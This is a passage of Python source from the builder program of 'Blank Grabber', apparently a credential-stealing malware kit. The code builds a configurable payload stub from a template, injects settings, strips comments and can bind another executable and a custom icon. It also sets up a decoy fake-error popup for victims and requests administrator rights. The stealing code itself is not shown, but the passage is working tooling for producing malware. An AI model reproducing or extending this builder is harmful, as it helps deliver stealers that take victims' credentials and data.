		message= self.messageEntry.get().replace("\x22", "\\x22").replace("\x27", "\\x27")

		icon= self.iconVar.get()

		if title.strip() == message.strip() == "":
			self.master.fakeErrorData = [False, ("", "", 0)]
			self.destroy()

		elif title.strip() == "":
			cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('Title cannot be empty', 0, 'Error', 0+16);close()"'''.format(message, title, icon)
			subprocess.run(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
			return
		
		elif message.strip() == "":
			cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('Message cannot be empty', 0, 'Error', 0+16);close()"'''.format(message, title, icon)
			subprocess.run(cmd, shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
			return
		
		self.master.fakeErrorData = [True, (title, message, icon)]
		self.destroy()

class Builder(ctk.CTk):
	
	def __init__(self) -> None:
		super().__init__()

		ctk.set_appearance_mode("dark")
		self.title("Blank Grabber [Builder]")
		self.iconbitmap(os.path.join("Extras", "icon.ico"))
		self.geometry("1250x600")
		self.resizable(False, False)

		self.rowconfigure(0, weight= 1)
		self.rowconfigure(1, weight= 5)

		self.columnconfigure(0, weight= 1)
		self.columnconfigure(1, weight= 0)

		self.titleLabel = ctk.CTkLabel(self, text= "Blank Grabber", font= ctk.CTkFont(size= 68, weight= "bold"), text_color= "#2F58CD")
		self.titleLabel.grid(row= 0, column= 0)

		self.builderOptions = BuilderOptionsFrame(self)
		self.builderOptions.grid(row= 1, column= 0, sticky= "nsew")
	
	def BuildPythonFile(self, config: str) -> None:
		options = json.loads(config)
		outPath = filedialog.asksaveasfilename(confirmoverwrite= True, filetypes= [("Python Script", ["*.py","*.pyw"])], initialfile= "stub" + (".py" if options["settings"]["consoleMode"] == 2 else ".pyw"), title= "Save as")
		if outPath is None or not os.path.isdir(os.path.dirname(outPath)):
			return
		
		with open(os.path.join(os.path.dirname(__file__), "Components", "stub.py")) as file:
			code = file.read()
		
		sys.path.append(os.path.join(os.path.dirname(__file__), "Components")) # Adds Components to PATH

		if os.path.isdir(os.path.join(os.path.dirname(__file__), "Components", "__pycache__")):
			try:
				shutil.rmtree(os.path.join(os.path.dirname(__file__), "Components", "__pycache__"))
			except Exception:
				pass
		from Components import process
		_, injection = process.ReadSettings()
		code = process.WriteSettings(code, options, injection)

		if os.path.isfile(outPath):
			os.remove(outPath)

		try: 
			code = ast.unparse(ast.parse(code)) # Removes comments
		except Exception: 
			pass

		code = "# pip install pyaesm urllib3\n\n" + code

		with open(outPath, "w") as file:
			file.write(code)

		messagebox.showinfo("Success", "File saved as %r" % outPath)
	
	def BuildExecutable(self, config: str, iconFileBytes: bytes, boundFilePath: str) -> None:
		def Exit(code: int = 0) -> None:
			os.system("pause > NUL")
			exit(code)
		
		def clear() -> None:
			os.system("cls")
		
		def format(title: str, description: str) -> str:
			return "[{}\u001b[0m] \u001b[37;1m{}\u001b[0m".format(title, description)
		
		self.destroy()
		Utility.ToggleConsole(True)
		ctypes.windll.user32.FlashWindow(ctypes.windll.kernel32.GetConsoleWindow(), True)
		clear()

		if not os.path.isfile(os.path.join("env", "Scripts", "run.bat")):
			if not os.path.isfile(os.path.join("env", "Scripts", "activate")):
				print(format("\u001b[33;1mINFO", "Creating virtual environment... (might take some time)"))
				res = subprocess.run("python -m venv env", capture_output= True, shell= True)
				clear()
				if res.returncode != 0:
					print('Error while creating virtual environment ("python -m venv env"): {}'.format(res.stderr.decode(errors= "ignore")))
					Exit(1)

		print(format("\u001b[33;1mINFO", "Copying assets to virtual environment..."))
		for i in os.listdir(datadir := os.path.join(os.path.dirname(__file__), "Components")):
			if os.path.isfile(fileloc := os.path.join(datadir, i)):
				shutil.copyfile(fileloc, os.path.join(os.path.dirname(__file__), "env", "Scripts", i))
			else:
				shutil.copytree(fileloc, os.path.join(os.path.dirname(__file__), "env", "Scripts", i))

		with open(os.path.join(os.path.dirname(__file__), "env", "Scripts", "config.json"), "w", encoding= "utf-8", errors= "ignore") as file:
			file.write(config)

		clear()

		os.chdir(os.path.join(os.path.dirname(__file__), "env", "Scripts"))

		if os.path.isfile("icon.ico"):
			os.remove("icon.ico")
		
		if iconFileBytes:
			with open("icon.ico", "wb") as file:
				file.write(iconFileBytes)

		if os.path.isfile("bound.exe"):
			os.remove("bound.exe")

		if os.path.isfile(boundFilePath):
			shutil.copy(boundFilePath, "bound.exe")

		os.startfile("run.bat")

if __name__ == "__main__":

	if os.name == "nt":
		if not os.path.isdir(os.path.join(os.path.dirname(__file__), "Components")):
			subprocess.Popen('mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'Components folder cannot be found. Please redownload the files!\', 10, \'Error\', 16);close()"', shell= True, creationflags= subprocess.SW_HIDE | subprocess.CREATE_NEW_CONSOLE)
			exit(1)
		
		version = '.'.join([str(x) for x in (sys.version_info.major, sys.version_info.minor, sys.version_info.micro)])
		if not (parse_version(version) > parse_version("3.10")):
			subprocess.Popen(f'mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'Your Python version is {version} but version 3.10+ is required. Please update your Python installation!\', 10, \'Error\', 16);close()"', shell= True, creationflags= subprocess.SW_HIDE | subprocess.CREATE_NEW_CONSOLE)
			exit(1)
		if "windowsapps" in sys.executable.lower():
			subprocess.Popen('mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'It looks like you installed Python from Windows Store instead of using the official website https://python.org. Please disable/uninstall it and reinstall from the website.\', 10, \'Error\', 16);close()"', shell= True, creationflags= subprocess.SW_HIDE | subprocess.CREATE_NEW_CONSOLE)
			exit(1)

		Utility.CheckConfiguration()
		
		if Utility.CheckForUpdates():
			response = messagebox.askyesno("Update Checker", "A new version of the application is available. It is recommended that you update it to the latest version.\n\nDo you want to update the app? (you would be directed to the official github repository)")
			if response:
				webbrowser.open_new_tab("https://github.com/Blank-c/Blank-Grabber")
				exit(0)
	
		# Do not hide console so it can show if there is any error
		# Utility.ToggleConsole(False)
		
		if not Utility.IsAdmin():
			ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
			exit(0)
		
		Builder().mainloop()

	else:
		print("Only Windows OS is supported!")
		
